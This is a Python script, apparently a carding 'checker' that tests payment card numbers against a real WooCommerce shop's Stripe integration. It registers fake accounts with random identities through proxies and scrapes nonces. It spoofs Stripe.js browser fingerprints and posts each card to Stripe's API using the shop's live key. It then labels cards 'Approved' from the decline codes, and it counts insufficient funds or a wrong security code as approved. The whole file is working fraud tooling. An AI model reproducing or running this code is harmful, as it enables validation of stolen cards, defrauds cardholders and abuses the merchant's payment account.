import json
from bs4 import BeautifulSoup
import ssl
import certifi
import aiohttp
import asyncio
import random
import platform
import names
import random_address
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def StripeAuth(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]
        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#   
                try:     
                    session.headers.update({
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Origin': 'https://www.naturalmoldavites.com',
                        'Connection': 'keep-alive',
                        'Referer': 'https://www.naturalmoldavites.com/my-account/',
                    })
                    async with session.get(url='https://www.naturalmoldavites.com/my-account/', proxy=str(proxyrand), timeout=timeout) as resp:  
                        response = await resp.text()
                        soup = BeautifulSoup(response , 'lxml')
                        woo_register = soup.find("input", {"name": "woocommerce-register-nonce"})["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
                try :
                    data = {
                        'email': CorreoRand,
                        #'password':'JA00dhnNSKLS@',
                        'woocommerce-register-nonce': woo_register,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }
                    async with session.post('https://www.naturalmoldavites.com/my-account/', data=data, proxy=str(proxyrand), timeout=timeout) as resp:        
                            response = await resp.text()
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    async with session.get('https://www.naturalmoldavites.com/my-account/add-payment-method/', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()          
                        nonce_card = (response.split('"createSetupIntentNonce":"')[1]).split('","')[0]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [TypeError]. ♻️'  
                except IndexError :
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                except KeyError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 4------------------------------#
                #---------------------------------REQUEST NUMERO 4------------------------------#
                try :
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
                        'Accept': '*/*',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Content-Type': 'text/plain;charset=UTF-8',
                        'Origin': 'https://m.stripe.network',
                        'Connection': 'keep-alive',
                        'Referer': 'https://m.stripe.network/',
                    }
                    async with session.post('https://m.stripe.com/6', proxy=str(proxyrand),headers=headers, timeout=18) as resp:
                        response = await resp.json()
                        muid = response['muid']
                        guid = response['guid']
                        sid = response['sid']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [KeyError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                    
                try :
                    data = f'type=card&billing_details[name]=+&billing_details[email]={CorreoRand}&card[number]={ccnum}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2F3c{random.randint(10000,99999)}e{random.randint(1,9)}%3B+stripe-js-v3%2F{random.randint(1,9)}c{random.randint(1000,9999)}{random.randint(1,9)}e{random.randint(1,9)}&time_on_page={random.randint(10,99999)}&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1Jg2ZP2HmLHcEU0x'
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                        'Accept': 'application/json',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': 'https://js.stripe.com/',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://js.stripe.com',
                        'Connection': 'keep-alive',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                    }
                    async with session.post('https://api.stripe.com/v1/payment_methods', proxy=str(proxyrand),headers=headers,data=data, timeout=18) as resp:
                        response = await resp.json()
                        responsetexto = await resp.text()
                        if int(responsetexto.find('"decline_code"')) > 0 :
                            ree = response['error']['decline_code']
                            ree = str(ree).replace('_'," ").title()
                            await session.close()
                            return ree
                        elif int(responsetexto.find('"code"')) >= 0 :
                            ree = response['error']['code']
                            ree = str(ree).replace('_'," ").title()
                            await session.close()
                            return ree
                        idstripe = response['id']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [KeyError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 04. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 5------------------------------#
                #---------------------------------REQUEST NUMERO 5------------------------------#
                try :
                    data = {
                        'action': 'create_setup_intent',
                        'wcpay-payment-method': idstripe,
                        '_ajax_nonce': nonce_card,
                    }
                    async with session.post('https://www.naturalmoldavites.com/wp-admin/admin-ajax.php', data=data, proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 05. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------CHECCK REQUESTS------------------------------#
                if int(response.find('"status":"succeeded"')) > 0 :
                    await session.close()
                    return "Approved", "Approved"
                elif int(response.find('Your card has insufficient funds')) > 0 :
                    responsejson = json.loads(response)
                    stripemessage = responsejson['data']['error']['message']
                    await session.close()
                    return "Approved", stripemessage
                elif int(response.find('stripe_3ds2_fingerprint')) > 0 :
                    await session.close()
                    return "stripe_3ds2_fingerprint"
                elif int(response.find('three_d_secure_redirect')) > 0 :
                    await session.close()
                    return "three_d_secure_redirect"
                elif int(response.find('requires_action')) > 0 :
                    await session.close()
                    return "3D Required(Try Again)"
                elif int(response.find("Your card's security code is incorrect")) > 0 :
                    responsejson = json.loads(response)
                    stripemessage = responsejson['data']['error']['message']
                    await session.close()
                    return "Approved", stripemessage
                elif int(response.find('error')) > 0 :
                    responsejson = json.loads(response)
                    stripemessage = responsejson['data']['error']['message']
                    await session.close()
                    return stripemessage
                else :
                    await session.close()
                    print(f"STRIPE AUTH - {response}")
                    return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
            except (aiohttp.client_exceptions.ServerDisconnectedError):
                return "An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError):
                return "An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError):
                return "An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()
